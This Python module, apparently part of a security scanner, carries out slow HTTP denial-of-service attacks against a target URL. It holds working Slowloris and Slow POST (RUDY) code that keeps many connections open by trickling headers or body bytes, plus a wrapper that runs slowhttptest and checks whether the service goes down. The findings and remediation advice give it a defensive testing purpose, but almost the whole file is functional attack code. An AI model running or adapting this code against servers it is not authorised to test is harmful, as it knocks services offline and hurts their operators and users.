"""
Slow HTTP attacks module — Phase 9.2.
Implements: Slowloris (slow headers), Slow POST (RUDY), slowhttptest.
Holds N connections open as long as possible, monitoring server response time.
Only runs on scan_type == 'full'.
"""
from __future__ import annotations

import asyncio
import random
import shutil
import socket
import ssl
import time
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult, run_cmd

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


_DEFAULT_CONNECTIONS = 150
_DEFAULT_DURATION    = 30   # seconds
_HEADER_INTERVAL     = 10   # send partial header every N seconds


# ── Slowloris (slow headers) ──────────────────────────────────────────────────

async def _slowloris_worker(
    host: str,
    port: int,
    use_ssl: bool,
    stop_event: asyncio.Event,
    active_counter: list[int],
) -> None:
    """Hold a single TCP connection by sending headers very slowly."""
    loop = asyncio.get_event_loop()
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.setblocking(False)
        await loop.sock_connect(raw_sock, (host, port))

        if use_ssl:
            ctx_ssl = ssl.create_default_context()
            ctx_ssl.check_hostname = False
            ctx_ssl.verify_mode = ssl.CERT_NONE
            sock = ctx_ssl.wrap_socket(raw_sock, server_hostname=host)
        else:
            sock = raw_sock

        # Send partial HTTP request
        request = (
            f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)\r\n"
            f"Accept-language: en-US,en,q=0.5\r\n"
        )
        await loop.sock_sendall(sock, request.encode())
        active_counter[0] += 1

        while not stop_event.is_set():
            # Trickle one header every interval to keep connection alive
            await asyncio.sleep(_HEADER_INTERVAL)
            try:
                header = f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n"
                await loop.sock_sendall(sock, header.encode())
            except Exception:
                break

        active_counter[0] -= 1
        sock.close()
    except Exception:
        pass


async def _run_slowloris(
    ctx: "ScanContext",
    host: str,
    port: int,
    use_ssl: bool,
    n_connections: int,
    duration: int,
) -> tuple[int, int]:
    """
    Open N slow connections, hold them for `duration` seconds.
    Returns (peak_active, final_active).
    """
    active_counter = [0]
    stop_event = asyncio.Event()

    await ctx.log(
        f"ddos_slow: Slowloris {host}:{port} — {n_connections} connections, {duration}s",
        module="ddos_slow",
    )

    workers = [
        asyncio.create_task(
            _slowloris_worker(host, port, use_ssl, stop_event, active_counter)
        )
        for _ in range(n_connections)
    ]

    peak_active = 0
    elapsed = 0
    while elapsed < duration:
        await asyncio.sleep(5)
        elapsed += 5
        peak_active = max(peak_active, active_counter[0])
        await ctx.log(
            f"ddos_slow: Slowloris {elapsed}s — active={active_counter[0]}/{n_connections}",
            module="ddos_slow",
        )

    final_active = active_counter[0]
    stop_event.set()
    await asyncio.gather(*workers, return_exceptions=True)
    return peak_active, final_active


# ── Slow POST / RUDY ──────────────────────────────────────────────────────────

async def _slow_post_worker(
    url: str,
    host: str,
    port: int,
    use_ssl: bool,
    stop_event: asyncio.Event,
    active_counter: list[int],
    body_size: int = 10_000_000,
) -> None:
    """Send POST with huge Content-Length but drip body 1 byte/sec."""
    loop = asyncio.get_event_loop()
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.setblocking(False)
        await loop.sock_connect(raw_sock, (host, port))

        if use_ssl:
            ctx_ssl = ssl.create_default_context()
            ctx_ssl.check_hostname = False
            ctx_ssl.verify_mode = ssl.CERT_NONE
            sock = ctx_ssl.wrap_socket(raw_sock, server_hostname=host)
        else:
            sock = raw_sock

        path = url.split(host, 1)[-1] or "/"
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {body_size}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"\r\n"
        )
        await loop.sock_sendall(sock, headers.encode())
        active_counter[0] += 1

        sent = 0
        while not stop_event.is_set() and sent < body_size:
            await asyncio.sleep(1)
            try:
                chunk = b"X"
                await loop.sock_sendall(sock, chunk)
                sent += 1
            except Exception:
                break

        active_counter[0] -= 1
        sock.close()
    except Exception:
        pass


async def _run_slow_post(
    ctx: "ScanContext",
    url: str,
    host: str,
    port: int,
    use_ssl: bool,
    n_connections: int,
    duration: int,
) -> tuple[int, int]:
    active_counter = [0]
    stop_event = asyncio.Event()

    await ctx.log(
        f"ddos_slow: SlowPOST/RUDY {host}:{port} — {n_connections} connections, {duration}s",
        module="ddos_slow",
    )

    workers = [
        asyncio.create_task(
            _slow_post_worker(url, host, port, use_ssl, stop_event, active_counter)
        )
        for _ in range(n_connections)
    ]

    peak = 0
    elapsed = 0
    while elapsed < duration:
        await asyncio.sleep(5)
        elapsed += 5
        peak = max(peak, active_counter[0])
        await ctx.log(
            f"ddos_slow: SlowPOST {elapsed}s — active={active_counter[0]}/{n_connections}",
            module="ddos_slow",
        )

    final = active_counter[0]
    stop_event.set()
    await asyncio.gather(*workers, return_exceptions=True)
    return peak, final


# ── slowhttptest ──────────────────────────────────────────────────────────────

async def _run_slowhttptest(
    ctx: "ScanContext",
    url: str,
    mode: str,         # "slowloris" | "slowbody" | "range"
    connections: int,
    duration: int,
) -> tuple[int, str, str]:
    if not shutil.which("slowhttptest"):
        return -1, "", "slowhttptest not found"

    mode_flag = {
        "slowloris": "-H",   # slow headers
        "slowbody":  "-B",   # slow body (RUDY)
        "range":     "-R",   # Apache Range header
    }.get(mode, "-H")

    await ctx.log(
        f"ddos_slow: slowhttptest {mode} {url} — {connections} conns, {duration}s",
        module="ddos_slow",
    )

    cmd = [
        "slowhttptest",
        mode_flag,
        "-u", url,
        "-c", str(connections),
        "-l", str(duration),
        "-r", "200",        # connection rate
        "-t", "GET",
        "-x", "10",         # max data length per follow-up
        "-p", "3",          # probe interval
        "-o", "/tmp/slowhttptest_out",
    ]
    return run_cmd(cmd, timeout=duration + 30)


def _parse_slowhttptest(output: str) -> tuple[str, float]:
    """Return (status, service_availability_pct)."""
    # slowhttptest outputs: "service available: YES/NO"
    avail_m = re.search(r"service available:\s*(YES|NO)", output, re.IGNORECASE)
    avail = avail_m.group(1).upper() if avail_m else "UNKNOWN"

    # Connection success rate
    conn_m = re.search(r"(\d+)\s+connections\s+succeeded", output, re.IGNORECASE)
    total_m = re.search(r"(\d+)\s+connections\s+initiated", output, re.IGNORECASE)
    pct = 0.0
    if conn_m and total_m:
        succeeded = int(conn_m.group(1))
        total = int(total_m.group(1))
        pct = (succeeded / total * 100) if total else 0.0

    return avail, pct


import re


# ── Target latency probe ──────────────────────────────────────────────────────

async def _probe_latency(host: str, port: int, use_ssl: bool) -> float | None:
    try:
        import httpx
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{host}:{port}/"
        t0 = time.monotonic()
        async with httpx.AsyncClient(verify=False, timeout=5) as client:
            await client.get(url)
        return (time.monotonic() - t0) * 1000
    except Exception:
        return None


def _parse_url(target: str) -> tuple[str, int, bool, str]:
    """Return (host, port, use_ssl, url)."""
    if not target.startswith("http"):
        target = "http://" + target
    from urllib.parse import urlparse
    p = urlparse(target)
    host = p.hostname or target
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    url = target
    return host, port, use_ssl, url


def _make_finding(
    target: str,
    attack: str,
    peak_connections: int,
    n_connections: int,
    duration: int,
    baseline_ms: float | None,
    post_ms: float | None,
    service_up: bool,
) -> Finding:
    lat_change = ""
    if baseline_ms and post_ms:
        ratio = post_ms / baseline_ms
        lat_change = f"{ratio:.1f}x latency increase ({baseline_ms:.0f}ms → {post_ms:.0f}ms)"
    elif not service_up:
        lat_change = "service became unavailable"

    if not service_up or (baseline_ms and post_ms and post_ms > baseline_ms * 5):
        severity, cvss = "critical", 7.5
        impact = "Service became unavailable or severely degraded"
    elif baseline_ms and post_ms and post_ms > baseline_ms * 2:
        severity, cvss = "high", 6.5
        impact = "Service significantly slowed under attack"
    else:
        severity, cvss = "medium", 5.3
        impact = "Service remained responsive"

    return Finding(
        type="ddos",
        title=f"Slow HTTP attack ({attack}): {impact}",
        severity=severity,
        description=(
            f"Slow HTTP {attack} attack against {target} for {duration}s.\n\n"
            f"Peak connections held open: {peak_connections}/{n_connections}\n"
            f"Latency change: {lat_change or 'N/A'}\n"
            f"Service after attack: {'UP' if service_up else 'DOWN'}\n\n"
            f"Impact: {impact}"
        ),
        evidence=(
            f"attack={attack} target={target} peak_conns={peak_connections} "
            f"duration={duration}s service_up={service_up} {lat_change}"
        ),
        remediation=(
            "Configure server-level slow connection timeouts:\n"
            "  • Apache: RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500\n"
            "  • Nginx: client_header_timeout 10s; client_body_timeout 10s;\n"
            "  • IIS: connectionTimeout=\"00:00:20\"\n"
            "Limit max connections per IP. Deploy a WAF/CDN with slow-loris protection.\n"
            "Use async I/O servers (nginx, gunicorn+gevent) instead of threaded servers."
        ),
        cvss_score=cvss,
    )


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_ddos_slow(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    n_connections: int = _DEFAULT_CONNECTIONS,
    duration: int = _DEFAULT_DURATION,
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    host, port, use_ssl, url = _parse_url(target)

    # Baseline
    baseline_ms = await _probe_latency(host, port, use_ssl)
    if baseline_ms is None:
        await ctx.log(f"ddos_slow: target {url} unreachable", level="warning", module="ddos_slow")
        result.errors.append(f"target unreachable: {url}")
        return result
    await ctx.log(f"ddos_slow: baseline latency = {baseline_ms:.0f}ms", module="ddos_slow")

    # ── Attack 1: Slowloris ──
    peak_sl, _ = await _run_slowloris(ctx, host, port, use_ssl, n_connections, duration)
    post_ms_sl = await _probe_latency(host, port, use_ssl)
    service_up_sl = post_ms_sl is not None
    result.findings.append(_make_finding(
        target, "Slowloris", peak_sl, n_connections, duration,
        baseline_ms, post_ms_sl, service_up_sl,
    ))
    await asyncio.sleep(5)  # recovery window between attacks

    # ── Attack 2: Slow POST / RUDY ──
    peak_sp, _ = await _run_slow_post(ctx, url, host, port, use_ssl, n_connections // 2, duration)
    post_ms_sp = await _probe_latency(host, port, use_ssl)
    service_up_sp = post_ms_sp is not None
    result.findings.append(_make_finding(
        target, "SlowPOST/RUDY", peak_sp, n_connections // 2, duration,
        baseline_ms, post_ms_sp, service_up_sp,
    ))
    await asyncio.sleep(5)

    # ── Attack 3: slowhttptest (all modes) ──
    for mode in ("slowloris", "slowbody"):
        rc, stdout, stderr = await _run_slowhttptest(
            ctx, url, mode, n_connections // 3, duration // 2
        )
        if rc == -1:
            await ctx.log(f"ddos_slow: slowhttptest {mode} unavailable", level="warning", module="ddos_slow")
            continue

        combined = stdout + stderr
        svc_status, conn_pct = _parse_slowhttptest(combined)
        post_ms_sht = await _probe_latency(host, port, use_ssl)
        service_up_sht = svc_status != "NO" and post_ms_sht is not None

        result.findings.append(Finding(
            type="ddos",
            title=f"slowhttptest ({mode}): service={'available' if service_up_sht else 'unavailable'}",
            severity="critical" if not service_up_sht else "medium",
            description=(
                f"slowhttptest {mode} attack against {url}.\n"
                f"Connections: {n_connections // 3}, Duration: {duration // 2}s\n"
                f"Service status: {svc_status}\n"
                f"Connection success rate: {conn_pct:.1f}%\n\n"
                f"Output:\n{combined[:400]}"
            ),
            evidence=(
                f"slowhttptest mode={mode} url={url} "
                f"service={svc_status} conn_pct={conn_pct:.1f}%"
            ),
            remediation=(
                "Set short read timeouts on the web server. "
                "Use nginx/Apache mod_reqtimeout to drop slow clients. "
                "Deploy a CDN that terminates slow connections at the edge."
            ),
            cvss_score=7.5 if not service_up_sht else 5.3,
        ))

    total = len(result.findings)
    await ctx.log(f"ddos_slow: completed — {total} finding(s)", module="ddos_slow")
    return result
